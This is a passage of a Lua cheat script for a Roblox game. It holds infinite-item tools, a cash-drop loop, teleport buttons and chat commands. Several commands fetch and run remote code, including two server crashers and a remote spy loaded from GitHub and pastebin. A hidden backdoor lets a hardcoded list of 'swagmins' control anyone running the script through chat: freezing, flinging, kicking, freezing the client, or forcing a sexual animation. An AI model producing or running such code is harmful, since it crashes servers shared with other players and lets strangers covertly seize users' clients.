                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infham()
        local Food = '[Hamburger]'
        local FoodTexture = 'rbxassetid://3210917066'
        local FoodPath = game:GetService("Workspace").Ignored.Shop["[Hamburger] - $5"].Head
        local Holding = false
    
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Hamburger'
        InfiniteTool.ToolTip = 'buy hamburgers while holding, eat while using this tool'
        InfiniteTool.TextureId = FoodTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
    
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
    
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Food and not player.Character:FindFirstChild(Food) then
                    v.Parent = player.Character
                end
            end
            while Holding == true do
                wait(0)
                local TotalFood = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Food then
                        TotalFood = TotalFood + 1
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Food then
                        TotalFood = TotalFood + 1
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalFood)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (FoodPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Food then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(FoodPath.Parent.ClickDetector)
                if not player.Character:FindFirstChild(Food) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Food and not player.Character:FindFirstChild(Food) then
                            v.Parent = player.Character
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    
    infrev()
    infdb()
    infham()
    infrpg()
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
CashDroppedLabel.Visible = false

CalculateButton.MouseButton1Click:Connect(function()
    if tonumber(CashTextbox.Text) ~= nil then
        CashTextbox.Text = tostring(math.floor((tonumber(CashTextbox.Text) * 1.42857)))
        local amount = tonumber(CashTextbox.Text)
        cashgoal = player.DataFolder.Currency.Value - amount
        CashAtEndLabel.Text = ('Cash At End : $' .. formatNumber(cashgoal))
    else
        announce('insert number', '', 3)
    end
end)

DropToggleButton.MouseButton1Click:Connect(function()
    if DropToggleButton.Text == 'Enable' and tonumber(CashTextbox.Text) ~= nil then
        DropToggleButton.Text = 'Stop'
        while DropToggleButton.Text == 'Stop' do
            wait()
            MainEvent:FireServer('DropMoney', '10000')
            if player.DataFolder.Currency.Value <= cashgoal then
                DropToggleButton.Text = 'Enable'
                announce('finished dropping')
            end
        end
    else
        DropToggleButton.Text = 'Enable'
    end
end)


CrashServerButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
end)
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

SetSpawn.MouseButton1Click:Connect(function()
    if player.Character then
        if SetSpawn.Text == 'SetSpawn' then
            SetSpawn.Text = 'NoSpawn' 
            SpawnPosition = player.Character.HumanoidRootPart.CFrame
        else
            SetSpawn.Text = 'SetSpawn'
            SpawnPosition = nil
        end
    end
end)
PrevPosition.MouseButton1Click:Connect(function()
    if PreviousPosition ~= nil then
        player.Character.HumanoidRootPart.CFrame = PreviousPosition
    else
        announce('Previous Position Error', 'you need to have tped before to return to an old position', 5)
    end
end)
Bank.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9783134, -285.587372, 0.0165725499, 5.298579e-08, -0.99986279, 1.16139711e-08, 1, 5.31855591e-08, 0.99986279, -1.24937944e-08, 0.0165725499)
end)
Playground.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-259.516907, 22.1498718, -762.971558, 0.992310345, 0, 0.12377467, 0, 1, 0, -0.12377467, 0, 0.992310345)
end)
LavaBase.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-796.256897, -39.6492004, -886.306152, -0.39699012, 2.91068263e-05, 0.917822897, 1.63490836e-06, 1, -3.10057476e-05, -0.917822897, -1.08084187e-05, -0.39699012)
end)
GunShop1.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-591.085022, 8.31477833, -742.803528, 0.994070172, 5.60480942e-08, 0.108740292, -6.51724079e-08, 1, 8.03552425e-08, -0.108740292, -8.69656134e-08, 0.994070172)
end)
GunShop2.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(488.347412, 48.0705032, -630.454285, -0.0453165509, -4.20173549e-08, -0.998972654, -4.23235385e-08, 1, -4.01406339e-08, 0.998972654, 4.04610248e-08, -0.0453165509)
end)
Sewer.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(111.514938, -26.7500305, -276.918365, -0.997865558, -1.25138016e-08, -0.0653034225, -1.74378947e-08, 1, 7.48333733e-08, 0.0653034225, 7.58124159e-08, -0.997865558)
end)
GasStation.MouseButton1Click:Connect(function()
   PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -3.41755495e-08, -0.996165276, 1.23318324e-08, 1, -3.53901868e-08, 0.996165276, -1.53808717e-08, -0.0874911696)
end)
TacoShop.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(583.931641, 51.061409, -476.954193, -0.999745369, 1.49123665e-08, -0.0225663595, 1.44838328e-08, 1, 1.91533687e-08, 0.0225663595, 1.88216429e-08, -0.999745369)
end)
UFO.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313)
end)
SafeZone1.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
end)
SafeZone2.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397)
end)
SavePos.MouseButton1Click:Connect(function()
    SavedPos = player.Character.HumanoidRootPart.CFrame
end)
LoadPos.MouseButton1Click:Connect(function()
    if SavedPos ~= nil then
        player.Character.HumanoidRootPart.CFrame = SavedPos
    else
        announce('Load Position Error', 'you need to save a position first', 4)
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------


local swagmins = {
  200547759, -- Mas2n
  44694442, -- SWAGM0DE
  92157681, -- Ninaly4567
  1688589423, -- KR1STlNA
  2351144328, -- suslevel9999
  1997397874, 
}

local bending = false
local kickmsg = 'PERMA BANNED'
local function commands(msg,plr)
    if DisableMod == false or table.find(swagmins, plr) then
        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg,' ')
        local Lower = string.lower(player.Name)
        local Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], ':freeze') then
                player.Character.HumanoidRootPart.Anchored = true
            end
            if string.find(SplitCMD[1], ':thaw') then
                player.Character.HumanoidRootPart.Anchored = false
            end
            if string.find(SplitCMD[1], ':benx') then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
            end
            if string.find(SplitCMD[1], ':unbenx') then
                while bending == true do
                    wait()
                    bending = false
                end
            end
            if string.find(SplitCMD[1], ':kick') then
                local ISADMIN = table.find(swagmins, player.UserId)
                if not ISADMIN then
                    kickmsg = Mod.Name
                    player:Kick(kickmsg)
                    wait(5)
                    while true do end
                end
            end
            if string.find(SplitCMD[1], ':bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
            end
            if string.find(SplitCMD[1], ':cuffban') then
                if table.find(swagmins, plr) then
                    local ISADMIN = table.find(swagmins, player.UserId)
                    if not ISADMIN then
                        player:Kick('Stop .')
                    end
                end
            end
            if string.find(SplitCMD[1], ':fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end
        else
            if string.find(msg, '/e test') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
            end
        end
    end
end

muted = {}
mutingnew = false 

local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/swagmode/swagmode/main/modlist'))()
Players.PlayerAdded:Connect(function(plr)
    local SWAGMIN = table.find(swagmins, plr.UserId)
    if SWAGMIN or ModCheck[plr.UserId] then
        plr.Chatted:Connect(function(msg)
            commands(msg, plr.UserId)
        end)
    end
    if muteingnew == true then
        if not table.find(muted, plr.Name) then
            table.insert(muted, plr.Name)
            print('automuted ' .. plr.Name)
        end
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    local SWAGMIN = table.find(swagmins, v.UserId)
    if SWAGMIN or ModCheck[v.UserId] then
        print('found')
        v.Chatted:Connect(function(msg)
           commands(msg, v.UserId)
        end)
    end
end


------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

    local commands = {}
    
    local prefix = "/"

    local function findPlayer(name)
        for _, Player in ipairs(Players:GetPlayers()) do
            if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then
                return Player;
            end
        end
    end
    
    commands.e = function(arguments)
        local CMD = arguments[1]
        
        if CMD == 'rejoin' or CMD == 'rj' then
            Players.LocalPlayer:Kick("Rejoining")
		    wait()
		    game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
        end
        if CMD == 'serverhop' or CMD == 'shop' then
        	local x = {}
        	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
        		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
        			x[#x + 1] = v.id
        		end
        	end
        	if #x > 0 then
        		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
        	else
        		print('failed to find server')
        	end
        end
        
        local ANIMATIONS = false
        if CMD == 'animations' and player.PlayerGui.MainScreenGui.AnimationPack.Visible == false and ANIMATIONS == false then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
            ANIMATIONS = true
            local AnimationsFolder = Instance.new('Folder', game.Workspace)
            local LeanAni = Instance.new('Animation', AnimationsFolder)
            LeanAni.AnimationId = 'rbxassetid://3152375249'
            local Lean = Humanoid:LoadAnimation(LeanAni)
            local LayAni = Instance.new('Animation', AnimationsFolder)
            LayAni.AnimationId = 'rbxassetid://3152378852'
            local Lay = Humanoid:LoadAnimation(LayAni)
            local Dance1Ani = Instance.new('Animation', AnimationsFolder)
            Dance1Ani.AnimationId = 'rbxassetid://3189773368'
            local Dance1 = Humanoid:LoadAnimation(Dance1Ani)
            local Dance2Ani = Instance.new('Animation', AnimationsFolder)
            Dance2Ani.AnimationId = 'rbxassetid://3189776546'
            local Dance2 = Humanoid:LoadAnimation(Dance2Ani)
            local GreetAni = Instance.new('Animation', AnimationsFolder)
            GreetAni.AnimationId = 'rbxassetid://3189777795'
            local Greet = Humanoid:LoadAnimation(GreetAni)
            local PrayAni = Instance.new('Animation', AnimationsFolder)
            PrayAni.AnimationId = 'rbxassetid://3487719500'
            local Pray = Humanoid:LoadAnimation(PrayAni)

            Close.Visible = false
            ScrollingFrame.Visible = false
            Animations.Visible = true
            
            Animations.MouseButton1Click:Connect(function()
                ScrollingFrame.Visible = true
                Close.Visible = true
            end)
            Close.MouseButton1Click:Connect(function()
                ScrollingFrame.Visible = false
                Close.Visible = false
            end)
            LeanButton.MouseButton1Click:Connect(function()
                Lean:Play()
            end)
            LayButton.MouseButton1Click:Connect(function()
                Lay:play()
            end)
            Dance1Button.MouseButton1Click:Connect(function()
                Dance1:Play()
            end)
            Dance2Button.MouseButton1Click:Connect(function()
                Dance2:Play()
            end)
            GreetButton.MouseButton1Click:Connect(function()
                Greet:Play()
            end)
            PrayButton.MouseButton1Click:Connect(function()
                Pray:Play()
            end)
            
            Humanoid.Running:Connect(function()
                Lean:Stop()
                Lay:Stop()
                Dance1:Stop()
                Dance2:Stop()
                Greet:Stop()
                Pray:Stop()
                ChestPump:Stop()
            end)
        end

        if CMD == 'korblox' then
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightLowerLeg:Destroy()
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightUpperLeg:Destroy()
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightFoot:Destroy()
        end

        if CMD == 'crash' then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
        end

        if CMD == 'lettuce' then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Lettuce'
            LettuceTool.ToolTip = 'inf lettuce eater yummy'
            
            local function eat()
                local Food = player.Backpack:FindFirstChild('[Lettuce]')
                if Food and player.Character.BodyEffects.Attacking.Value == false then
                    Humanoid:EquipTool(Food)
                    player.Character:FindFirstChildWhichIsA('Tool'):Activate()
                    repeat wait() until player.Character.BodyEffects.Attacking.Value == false
                    Humanoid:EquipTool(LettuceTool)
                    
                end
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Lettuce') do
                    wait()
                    local pathto = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].Head
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Lettuce') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Lettuce]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end)
        end
        
        if CMD == 'fov' then
            if game.Workspace:FindFirstChildWhichIsA('Camera') then
                game.Workspace:FindFirstChildWhichIsA('Camera').FieldOfView = tonumber(arguments[2])
            end
        end
        
        BRIGHT = false
        if CMD == 'bright' or CMD == 'unbright' then
            if BRIGHT == false then
                BRIGHT = true
                game:GetService("Lighting").GlobalShadows = false
            else
                BRIGHT = false
                game:GetService("Lighting").GlobalShadows = true
            end
        end
        
        if CMD == 'tool' or CMD == 'tools' then
            for i,v in pairs(game:GetService("Workspace").Ignored.ItemsDrop:GetChildren()) do
                player.Character.HumanoidRootPart.CFrame = v.CFrame
                wait(0.01)
            end
        end
        
        if CMD == 'zoom' or CMD == 'infzoom' then
            player.CameraMaxZoomDistance = math.huge
        end
        
        FOG = false
        if CMD == 'fog' then
            if FOG == false then
                FOG = true
                game:GetService("Lighting").FogEnd = 5000
            else
                FOG = false
                game:GetService("Lighting").FogEnd = 500
            end
        end
        
    	if CMD == 'set' then
    	    local plrtotarget = arguments[2]
    	    if plrtotarget then
    		    local playr = findPlayer(plrtotarget)
    		    if playr then
                    TargetTextbox.Text = playr.Name
                    SetPlayerInfo()
    		    end
    	    end
    	end   
    	
    	if CMD == 'float' then
            if player.Character:FindFirstChildWhichIsA('Tool') then
                if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
                    player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
                end
            end
    	end
    	  
    	if CMD == 'to' then
        	local playerToTeleportToName = arguments[2]
    	    if playerToTeleportToName then
    		    local plrToTPTo = findPlayer(playerToTeleportToName)
    		    if plrToTPTo then
    			    game:GetService('Workspace').Players:WaitForChild(player.Name).HumanoidRootPart.CFrame = game:GetService('Workspace').Players:WaitForChild(plrToTPTo.Name).HumanoidRootPart.CFrame
    			    if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                        player.Character.LeftHand.CFrame = player.Character.HumanoidRootPart.CFrame
                        player.Character.RightHand.CFrame = player.Character.HumanoidRootPart.CFrame
                    end
    		    end
    	    end
    	end
    	
    	if CMD == 'sit' then
    	    game.Players.LocalPlayer.Character.Humanoid.Sit = true
    	end
    	
    	if CMD == 'recoil' then
    	    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
                if v:IsA('Camera') then
                v:Destroy()
                end
            end

            local newcam = Instance.new('Camera')
            newcam.Parent = game:GetService('Workspace')
            newcam.Name = 'Camera'
            newcam.CameraType = 'Custom'
            newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
            newcam.HeadLocked = true
            newcam.HeadScale = 1
        	    
    	end
    
    	if CMD == 'headless' then
    	    player.Character.Head:BreakJoints()
    	    player.Character.Head.Position = Vector3.new(0,99999999999999,0)
    	end
    	
        if CMD == 'hideboombox' or CMD == 'boombox' then
            player.Character.BOOMBOXHANDLE:Destroy()
        end
        
    	if CMD == 'reach' or CMD == 'toolreach' then
    	    if player.Character:FindFirstChildWhichIsA('Tool') then
    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
    	    end
    	end
    	if CMD == 'taser' then
    	    player.Character.HumanoidRootPart.CFrame = CFrame.new(-271.194, 21.8, -103.052)
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Taser'
            LettuceTool.ToolTip = 'tazer'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == '[Taser]' then
                        v.Parent = player.Character
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == '[Taser]' then
                        v:Activate()
                    end
                end
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Unequipped:Connect(function()
                
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Taser') do
                    local a = 0
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Taser]' then
                            a = a + 1
                        end
                    end
                    LettuceTool.ToolTip = tostring(a)
                    wait(3)
                end
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Taser') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Taser]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
            	
    	if CMD == 'view' then
    	    local plrtoview = arguments[2]
            if plrtoview then
                local ptv = findPlayer(plrtoview)
                if ptv then  
                    local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
                    View.Text = "Unview"
                    repeat view(ptv.Name) until View.Text == 'View' 
                    Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
                end
            end
    	end
    
        if CMD == 'unview' then
            local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
            Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
            View.Text = "View"
        end
        
        if CMD == 'shield' then
            if IsMod == true then
                DisableMod = true
                announce('Immune to mod powers', '', 4)
            end
        end
        if CMD == 'unshield' then
            if IsMod == true then
                DisableMod = false
                announce('Unimmune to mod powers', '', 4)
            end
        end

        if CMD == 're' then
            player.Character:Destroy()
        end

        if CMD == 'ping' then
            while wait() do
                local Animations = game.Players.LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('AnimationPack')  
                if Animations then
                    Animations.TextScaled = true
                    Animations.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                end
            end
        end
        
        if CMD == 'faceless' or CMD == 'noface' then
            player.Character.Head.face:Destroy()
        end
        
        if CMD == 'hidemask' then
            player.Character:FindFirstChild('In-gameMask').Handle:Destroy()
        end
        if CMD == 'names' then
            local function checkdisplay()
                for i,v in pairs(game:GetService('Workspace').Players:GetChildren()) do
                    if v.Name ~= game.Players:FindFirstChild(v.Name).DisplayName then
                        if v:FindFirstChild('UpperTorso'):FindFirstChild('OriginalSize') or v:FindFirstChild('LowerTorso'):FindFirstChild('OriginalSize') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = (game.Players:FindFirstChild(v.Name).DisplayName .. ' / ' .. v.Name)
                        end
                    end
                end
            end
            checkdisplay()
        end
        if CMD == 'remotespy' then
            loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
        end
        if CMD == 'flashlight' then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
            local mouse = player:GetMouse()
            local hold = player.Character.Humanoid:LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.SmallGunAim)
            
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Flashlight'
            LettuceTool.ToolTip = 'rpg'
            local gun = '[Flashlight]'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == gun then
                        v.Parent = player.Character
                    end
                end
                wait(0.2)
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == gun then
                        v:Activate()
                    end
                end
            end
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Unequipped:Connect(function()
                hold:Stop()
            end)
            LettuceTool.Equipped:Connect(function()
                hold:Play()
                local ammo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == gun then
                        ammo = ammo + v.Ammo.Value
                    end
                end
                LettuceTool.ToolTip = ammo
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Flashlight') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Flashlight]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
        if CMD == 'nuke' then
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Nuke'
            LettuceTool.ToolTip = 'tazer'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == '[Grenade]' then
                        v.Parent = player.Character
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == '[Grenade]' then
                        v:Activate()
                        v:Activate()
                    end
                end
        
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
                for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
                    if v.Name == 'Handle' then
                        v.Position = mouse.Hit.p
                    end
                end
            end)
            LettuceTool.Unequipped:Connect(function()
                hold:Stop()
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Nuke') do
                    local a = 0
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Grenade]' then
                            a = a + 1
                        end
                    end
                    LettuceTool.ToolTip = tostring(a)
                    wait(3)
                end
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Nuke') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Grenade]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
        if CMD == 'mute' then
            if tostring(arguments[2]) == 'all' then
                muteingnew = true
                for _,v in pairs(Players:GetChildren()) do
                    if not table.find(muted, v.Name) then
                        table.insert(muted, v.Name)
